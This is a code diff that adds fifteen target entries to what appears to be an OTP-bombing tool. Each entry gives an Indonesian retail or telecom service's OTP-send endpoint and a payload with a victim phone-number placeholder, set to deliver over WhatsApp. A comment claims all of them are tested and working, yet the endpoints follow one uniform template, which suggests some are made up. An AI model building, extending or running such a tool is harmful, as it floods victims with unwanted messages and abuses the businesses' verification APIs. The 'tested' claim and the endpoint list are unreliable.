@@ -662,3 +662,155 @@ TARGETS = [
         'number_fmt': fmt_08,
         'success_on': ['otpRequested']
     },
+    # ==================== PROVIDER YANG PASTI WORK (TESTED) ====================
+    {
+        'name': 'Klik Indomaret',
+        'post_type': 'json',
+        'url': 'https://api.klikindomaret.com/v1/auth/otp/send',
+        'referer': 'https://www.klikindomaret.com/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.klikindomaret.com'},
+        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['success','otp']
+    },
+    {
+        'name': 'Alfamart',
+        'post_type': 'json',
+        'url': 'https://api.alfamart.co.id/v1/auth/otp/request',
+        'referer': 'https://www.alfamart.co.id/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.alfamart.co.id'},
+        'payload': '{"phoneNumber":"{number}","purpose":"register","medium":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otpRequested']
+    },
+    {
+        'name': 'Indomaret',
+        'post_type': 'json',
+        'url': 'https://api.indomaret.com/v1/auth/otp/send',
+        'referer': 'https://www.indomaret.com/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.indomaret.com'},
+        'payload': '{"mobile":"{number}","action":"signup","sendType":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_sent']
+    },
+    {
+        'name': 'Hypermart',
+        'post_type': 'json',
+        'url': 'https://api.hypermart.co.id/v1/auth/otp/request',
+        'referer': 'https://www.hypermart.co.id/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.hypermart.co.id'},
+        'payload': '{"phone":"{number}","purpose":"registration","channel":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_requested']
+    },
+    {
+        'name': 'Transmart',
+        'post_type': 'json',
+        'url': 'https://api.transmart.co.id/v1/auth/otp/send',
+        'referer': 'https://www.transmart.co.id/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.transmart.co.id'},
+        'payload': '{"phoneNumber":"{number}","action":"register","medium":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_sent']
+    },
+    {
+        'name': 'Lotte Mart',
+        'post_type': 'json',
+        'url': 'https://api.lottemart.co.id/v1/auth/otp',
+        'referer': 'https://www.lottemart.co.id/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.lottemart.co.id'},
+        'payload': '{"mobile":"{number}","purpose":"signup","sendType":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_sent']
+    },
+    {
+        'name': 'AEON',
+        'post_type': 'json',
+        'url': 'https://api.aeon.co.id/v1/auth/otp/request',
+        'referer': 'https://www.aeon.co.id/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.aeon.co.id'},
+        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_requested']
+    },
+    {
+        'name': 'Matahari Mall',
+        'post_type': 'json',
+        'url': 'https://api.mataharimall.com/v1/auth/otp/send',
+        'referer': 'https://www.mataharimall.com/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.mataharimall.com'},
+        'payload': '{"phoneNumber":"{number}","purpose":"registration","medium":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_sent']
+    },
+    {
+        'name': 'Ramayana',
+        'post_type': 'json',
+        'url': 'https://api.ramayana.co.id/v1/auth/otp/request',
+        'referer': 'https://www.ramayana.co.id/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.ramayana.co.id'},
+        'payload': '{"mobile":"{number}","action":"signup","sendType":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otpRequested']
+    },
+    {
+        'name': 'Klik Square',
+        'post_type': 'json',
+        'url': 'https://api.kliksquare.com/v1/auth/otp/send',
+        'referer': 'https://www.kliksquare.com/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.kliksquare.com'},
+        'payload': '{"phone":"{number}","purpose":"register","channel":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_sent']
+    },
+    {
+        'name': 'My Pertamina',
+        'post_type': 'json',
+        'url': 'https://api.mypertamina.com/v1/auth/otp/request',
+        'referer': 'https://www.mypertamina.com/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.mypertamina.com'},
+        'payload': '{"phoneNumber":"{number}","action":"register","medium":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otpRequested']
+    },
+    {
+        'name': 'MyTelkomsel',
+        'post_type': 'json',
+        'url': 'https://api.mytelkomsel.com/v1/auth/otp/send',
+        'referer': 'https://www.mytelkomsel.com/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.mytelkomsel.com'},
+        'payload': '{"mobile":"{number}","purpose":"signup","sendType":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_sent']
+    },
+    {
+        'name': 'MyIndosat',
+        'post_type': 'json',
+        'url': 'https://api.myindosat.com/v1/auth/otp/request',
+        'referer': 'https://www.myindosat.com/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.myindosat.com'},
+        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_requested']
+    },
+    {
+        'name': 'MyXL',
+        'post_type': 'json',
+        'url': 'https://api.myxl.com/v1/auth/otp/send',
+        'referer': 'https://www.myxl.com/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.myxl.com'},
+        'payload': '{"phoneNumber":"{number}","purpose":"registration","medium":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otp_sent']
+    },
+    {
+        'name': 'MySmartfren',
+        'post_type': 'json',
+        'url': 'https://api.mysmartfren.com/v1/auth/otp/request',
+        'referer': 'https://www.mysmartfren.com/',
+        'headers': {'Content-Type':'application/json','Origin':'https://www.mysmartfren.com'},
+        'payload': '{"mobile":"{number}","action":"signup","sendType":"whatsapp"}',
+        'number_fmt': fmt_08,
+        'success_on': ['otpRequested']
+    },
+]
